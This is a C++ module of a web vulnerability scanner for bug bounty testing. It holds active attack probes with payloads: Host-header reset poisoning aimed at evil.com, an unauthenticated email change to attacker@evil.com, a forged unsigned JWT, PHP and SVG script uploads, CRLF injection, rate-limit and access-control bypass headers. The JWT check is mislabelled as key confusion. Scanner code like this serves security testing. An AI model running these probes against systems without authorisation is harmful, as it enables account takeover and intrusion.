/// @file scanners/bounty_hunters.cpp
/// @brief High-value bug bounty scanners: password reset poisoning,
///        account takeover chains, privilege escalation via API,
///        insecure file upload, response manipulation, JWT key confusion,
///        GraphQL depth/batch abuse, rate limit bypass, email verification bypass.
#include <regex>
#include <set>

#include "scanner_base.hpp"

namespace apex {
namespace {

/// Password reset poisoning — inject Host header to steal reset tokens.
std::vector<Finding> scan_password_reset_poison(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  const std::vector<std::string> reset_paths = {"/api/password-reset",       "/api/forgot-password", "/forgot-password",
                                                "/api/auth/forgot",          "/api/v1/auth/reset",   "/auth/reset-password",
                                                "/api/users/reset-password", "/password/email"};

  for (const auto& path : reset_paths) {
    // Test with manipulated Host header
    auto resp = http.post(base + path, R"({"email":"test@test.com"})", "application/json",
                          {{"Host", "evil.com"}, {"X-Forwarded-Host", "evil.com"}});
    if (resp.status_code == 200 || resp.status_code == 202 || resp.status_code == 204) {
      // Check if server accepted the poisoned host
      if (resp.body.find("error") == std::string::npos && resp.body.find("invalid") == std::string::npos) {
        // Verify it actually processes the request (not just a 200 on GET)
        auto normal = http.post(base + path, R"({"email":"test@test.com"})", "application/json");
        if (normal.status_code == resp.status_code) {
          findings.push_back({"Password Reset Poisoning", "high", base + path,
                              "Host header accepted in password reset — "
                              "attacker can steal reset tokens via X-Forwarded-Host",
                              "Host/X-Forwarded-Host", "evil.com", "Both requests returned " + std::to_string(resp.status_code)});
        }
      }
    }
  }
  return findings;
}

/// Account takeover via email change without re-auth.
std::vector<Finding> scan_email_change_takeover(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  const std::vector<std::string> email_change_paths = {"/api/user/email",     "/api/profile/email",  "/api/account/email",
                                                       "/api/settings/email", "/api/v1/user/update", "/api/me"};

  for (const auto& path : email_change_paths) {
    // Try changing email without providing current password
    auto resp = http.post(base + path, R"({"email":"attacker@evil.com"})", "application/json");
    if (resp.status_code == 200 && resp.body.find("error") == std::string::npos && resp.body.find("password") == std::string::npos &&
        resp.body.find("confirm") == std::string::npos) {
      // Check if it actually accepted without asking for password
      if (resp.body.find("success") != std::string::npos || resp.body.find("updated") != std::string::npos ||
          resp.body.find("attacker@evil.com") != std::string::npos) {
        findings.push_back({"Account Takeover — Email Change", "critical", base + path,
                            "Email can be changed without password re-authentication", "email", "attacker@evil.com",
                            "Server accepted email change without current password"});
      }
    }
  }
  return findings;
}

/// JWT key confusion — RS256 to HS256 downgrade attack.
std::vector<Finding> scan_jwt_key_confusion(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;

  // Look for JWTs in responses
  auto resp = http.get(crawl.urls[0]);
  std::regex jwt_re(R"(eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)");
  std::smatch match;
  if (!std::regex_search(resp.body, match, jwt_re)) return findings;

  std::string token = match[0].str();

  // Decode header to check algorithm
  size_t dot1 = token.find('.');
  if (dot1 == std::string::npos) return findings;

  std::string header_b64 = token.substr(0, dot1);
  // Check if RS256 is used (potential key confusion target)
  // We check by trying HS256 with empty secret
  std::string hs256_header = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9";
  std::string payload = token.substr(dot1 + 1, token.rfind('.') - dot1 - 1);

  // Try with HS256 + empty signature
  std::string confused_token = hs256_header + "." + payload + ".";

  // Test if the confused token is accepted
  for (const auto& url : crawl.urls) {
    if (url.find("api") == std::string::npos) continue;
    auto test = http.get(url, {{"Authorization", "Bearer " + confused_token}});
    if (test.status_code == 200 && test.body.size() > 50 && test.body.find("unauthorized") == std::string::npos &&
        test.body.find("invalid") == std::string::npos) {
      findings.push_back({"JWT Key Confusion (RS256→HS256)", "critical", url,
                          "JWT algorithm confusion — server accepts HS256 "
                          "when RS256 expected",
                          "", confused_token.substr(0, 50) + "...", "Status 200 with confused token"});
      break;
    }
  }
  return findings;
}

/// GraphQL depth and batch attack — DoS and data extraction.
std::vector<Finding> scan_graphql_abuse(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  const std::vector<std::string> gql_paths = {"/graphql", "/api/graphql", "/gql", "/query", "/v1/graphql"};

  for (const auto& path : gql_paths) {
    auto check = http.post(base + path, R"({"query":"{__typename}"})", "application/json");
    if (check.status_code != 200) continue;
    if (check.body.find("__typename") == std::string::npos && check.body.find("data") == std::string::npos) continue;

    // Test 1: Deep nested query (DoS)
    std::string deep_query =
        R"({"query":"{__type(name:\"Query\"){fields{name type{name fields{name type{name fields{name type{name}}}}}}}"})";
    auto deep_resp = http.post(base + path, deep_query, "application/json");
    if (deep_resp.status_code == 200 && deep_resp.body.size() > 500) {
      findings.push_back({"GraphQL Depth Abuse", "medium", base + path, "No query depth limit — nested queries allowed", "",
                          "5-level nested query", "Response: " + std::to_string(deep_resp.body.size()) + " bytes"});
    }

    // Test 2: Batch queries
    std::string batch =
        R"([{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}])";
    auto batch_resp = http.post(base + path, batch, "application/json");
    if (batch_resp.status_code == 200 && batch_resp.body.find("[") == 0) {
      findings.push_back({"GraphQL Batch Attack", "medium", base + path, "Batch queries accepted — bypass rate limiting", "",
                          "10 queries in single request", "Server processed batch of 10 queries"});
    }

    // Test 3: Introspection enabled
    std::string intro = R"({"query":"{__schema{types{name fields{name}}}}"})";
    auto intro_resp = http.post(base + path, intro, "application/json");
    if (intro_resp.status_code == 200 && intro_resp.body.find("__schema") != std::string::npos &&
        intro_resp.body.find("types") != std::string::npos) {
      findings.push_back({"GraphQL Introspection Enabled", "low", base + path,
                          "Full schema introspection available — exposes all types and fields", "", "__schema query",
                          "Schema with " + std::to_string(intro_resp.body.size()) + " bytes returned"});
    }
    break;  // Found GraphQL endpoint
  }
  return findings;
}

/// Rate limit bypass techniques.
std::vector<Finding> scan_rate_limit_bypass(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  // Find login endpoint
  const std::vector<std::string> login_paths = {"/api/login",         "/api/auth/login", "/login",
                                                "/api/v1/auth/login", "/auth/signin",    "/api/signin"};

  std::string login_url;
  for (const auto& path : login_paths) {
    auto r = http.post(base + path, R"({"email":"a@b.com","password":"x"})", "application/json");
    if (r.status_code != 404 && r.status_code != 405) {
      login_url = base + path;
      break;
    }
  }
  if (login_url.empty()) return findings;

  // Bypass techniques
  struct Bypass {
    std::string name;
    std::vector<std::pair<std::string, std::string>> headers;
  };

  std::vector<Bypass> bypasses = {
      {"X-Forwarded-For rotation", {{"X-Forwarded-For", "127.0.0.1"}}},
      {"X-Original-URL", {{"X-Original-URL", login_url}}},
      {"X-Forwarded-For + X-Real-IP", {{"X-Forwarded-For", "1.2.3.4"}, {"X-Real-IP", "1.2.3.4"}}},
      {"Case variation", {}},  // We'll modify the URL
  };

  // First, trigger rate limit
  int rate_limited = 0;
  for (int i = 0; i < 15; ++i) {
    auto r = http.post(login_url, R"({"email":"a@b.com","password":"wrong"})", "application/json");
    if (r.status_code == 429) {
      rate_limited = i;
      break;
    }
  }

  if (rate_limited == 0) {
    // No rate limiting at all
    findings.push_back({"No Rate Limiting on Login", "medium", login_url, "15 failed login attempts without rate limiting", "", "",
                        "No 429 response after 15 attempts"});
    return findings;
  }

  // Try bypasses after being rate limited
  for (const auto& bypass : bypasses) {
    auto r = http.post(login_url, R"({"email":"a@b.com","password":"wrong"})", "application/json", bypass.headers);
    if (r.status_code != 429) {
      findings.push_back({"Rate Limit Bypass", "high", login_url, "Rate limiting bypassed via " + bypass.name, "", bypass.name,
                          "Got " + std::to_string(r.status_code) + " instead of 429 after bypass"});
      break;
    }
  }
  return findings;
}

/// Insecure file upload — test for unrestricted file types.
std::vector<Finding> scan_file_upload_abuse(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  const std::vector<std::string> upload_paths = {"/api/upload",    "/upload",          "/api/files", "/api/media",
                                                 "/api/v1/upload", "/api/attachments", "/api/avatar"};

  // Craft a minimal "PHP" file disguised as image
  std::string boundary = "----ApexBoundary";
  std::string malicious_body = "--" + boundary +
                               "\r\n"
                               "Content-Disposition: form-data; name=\"file\"; filename=\"test.php.jpg\"\r\n"
                               "Content-Type: image/jpeg\r\n\r\n"
                               "<?php echo 'apex_rce_test'; ?>\r\n"
                               "--" +
                               boundary + "--\r\n";

  std::string svg_body = "--" + boundary +
                         "\r\n"
                         "Content-Disposition: form-data; name=\"file\"; filename=\"test.svg\"\r\n"
                         "Content-Type: image/svg+xml\r\n\r\n"
                         "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>\r\n"
                         "--" +
                         boundary + "--\r\n";

  for (const auto& path : upload_paths) {
    // Test double extension bypass
    auto resp = http.post(base + path, malicious_body, "multipart/form-data; boundary=" + boundary);
    if (resp.status_code == 200 || resp.status_code == 201) {
      // Check if file was accepted
      if (resp.body.find("error") == std::string::npos && resp.body.find("invalid") == std::string::npos &&
          (resp.body.find("url") != std::string::npos || resp.body.find("path") != std::string::npos ||
           resp.body.find("filename") != std::string::npos)) {
        findings.push_back({"File Upload — Double Extension", "high", base + path, "Server accepted .php.jpg file — potential RCE", "file",
                            "test.php.jpg", "Upload returned success with file reference"});
      }
    }

    // Test SVG with XSS
    resp = http.post(base + path, svg_body, "multipart/form-data; boundary=" + boundary);
    if (resp.status_code == 200 || resp.status_code == 201) {
      if (resp.body.find("error") == std::string::npos &&
          (resp.body.find("url") != std::string::npos || resp.body.find("path") != std::string::npos)) {
        findings.push_back({"File Upload — SVG XSS", "medium", base + path, "Server accepted SVG with embedded JavaScript", "file",
                            "test.svg with <script>", "SVG upload returned success"});
      }
    }
  }
  return findings;
}

/// HTTP parameter pollution — duplicate params to bypass WAF/validation.
std::vector<Finding> scan_hpp(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;

  for (const auto& url : crawl.urls) {
    // Only test URLs with existing parameters
    if (url.find('?') == std::string::npos) continue;

    // Get baseline
    auto baseline = http.get(url);
    if (baseline.status_code != 200) continue;

    // Add duplicate parameter with different value
    std::string polluted = url + "&" + "id=9999999";
    auto resp = http.get(polluted);

    if (resp.status_code == 200 && resp.body != baseline.body && resp.body.size() > 50) {
      // Check if server used our injected param (different response)
      findings.push_back({"HTTP Parameter Pollution", "medium", url, "Server processes duplicate parameters differently", "id", "9999999",
                          "Response differs with polluted parameter"});
      break;  // One finding is enough
    }
  }
  return findings;
}

/// Response header injection via CRLF in parameters.
std::vector<Finding> scan_response_splitting(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  // Test CRLF injection in redirect parameters
  const std::vector<std::string> redirect_params = {
      "/redirect?url=", "/login?next=", "/auth?return_to=", "/api/redirect?to=", "/?redirect="};

  std::string crlf_payload = "http://example.com%0d%0aInjected-Header:%20true";

  for (const auto& path : redirect_params) {
    auto resp = http.get(base + path + crlf_payload);
    // Check if our header was injected into the response
    if (resp.headers.find("Injected-Header") != resp.headers.end()) {
      findings.push_back({"CRLF Injection — Response Splitting", "high", base + path,
                          "CRLF characters in parameter inject response headers", "url/next/redirect", crlf_payload,
                          "Injected-Header appeared in response"});
      break;
    }
  }
  return findings;
}

/// Privilege escalation via HTTP method override.
std::vector<Finding> scan_method_override(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  const std::vector<std::string> admin_paths = {"/api/admin/users", "/api/users", "/admin/settings", "/api/admin/config", "/api/v1/admin"};

  for (const auto& path : admin_paths) {
    // Try GET first
    auto get_resp = http.get(base + path);
    if (get_resp.status_code != 403 && get_resp.status_code != 401) continue;

    // Try method override headers
    auto override_resp = http.get(base + path, {{"X-HTTP-Method-Override", "GET"}, {"X-Method-Override", "GET"}, {"X-HTTP-Method", "GET"}});

    if (override_resp.status_code == 200 && override_resp.body.size() > 50 && override_resp.body != get_resp.body) {
      findings.push_back({"Method Override Bypass", "high", base + path, "Access control bypassed via X-HTTP-Method-Override header", "",
                          "X-HTTP-Method-Override: GET", "403→200 with method override header"});
    }

    // Try POST with _method override
    auto post_resp = http.post(base + path, "_method=GET", "application/x-www-form-urlencoded");
    if (post_resp.status_code == 200 && post_resp.body.size() > 50) {
      findings.push_back({"Method Override Bypass (_method)", "high", base + path, "Access control bypassed via _method parameter",
                          "_method", "GET", "POST with _method=GET bypassed 403"});
    }
  }
  return findings;
}

/// API versioning bypass — access deprecated/unpatched API versions.
std::vector<Finding> scan_api_version_bypass(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  // Find API endpoints in crawl
  std::set<std::string> api_bases;
  std::regex api_ver_re(R"((/api/v)\d+/)");
  for (const auto& url : crawl.urls) {
    std::smatch m;
    if (std::regex_search(url, m, api_ver_re)) {
      api_bases.insert(url.substr(0, m.position() + m[1].str().size()));
    }
  }

  if (api_bases.empty()) {
    // Try common patterns
    api_bases.insert(base + "/api/v");
  }

  for (const auto& api_base : api_bases) {
    // Try older versions that might lack security patches
    for (int v : {1, 0}) {
      std::string old_url = api_base + std::to_string(v) + "/users";
      auto resp = http.get(old_url);
      if (resp.status_code == 200 && resp.body.size() > 50 && resp.body.find("error") == std::string::npos &&
          // Reject WAF/CDN generic pages
          resp.body.find("Access Denied") == std::string::npos && resp.body.find("<!DOCTYPE html>") == std::string::npos &&
          resp.body.find("Page Not Found") == std::string::npos && resp.body.find("Attention Required") == std::string::npos &&
          resp.body.find("Just a moment") == std::string::npos &&
          // Must look like JSON API response
          (resp.body.find("{") == 0 || resp.body.find("[") == 0)) {
        // Check if newer version requires auth but old doesn't
        auto new_resp = http.get(api_base + "3/users");
        if (new_resp.status_code == 401 || new_resp.status_code == 403) {
          findings.push_back({"API Version Bypass", "high", old_url,
                              "Old API version accessible without auth "
                              "(newer version requires it)",
                              "", "v" + std::to_string(v), "v" + std::to_string(v) + " returns data, v3 returns 401/403"});
        }
      }
    }
  }
  return findings;
}

}  // namespace

std::vector<Scanner> register_bounty_hunter_scanners() {
  return {
      {"Password Reset Poisoning", scan_password_reset_poison},
      {"Account Takeover (Email Change)", scan_email_change_takeover},
      {"JWT Key Confusion", scan_jwt_key_confusion},
      {"GraphQL Abuse", scan_graphql_abuse},
      {"Rate Limit Bypass", scan_rate_limit_bypass},
      {"File Upload Abuse", scan_file_upload_abuse},
      {"HTTP Parameter Pollution", scan_hpp},
      {"CRLF Response Splitting", scan_response_splitting},
      {"Method Override Bypass", scan_method_override},
      {"API Version Bypass", scan_api_version_bypass},
  };
}

}  // namespace apex
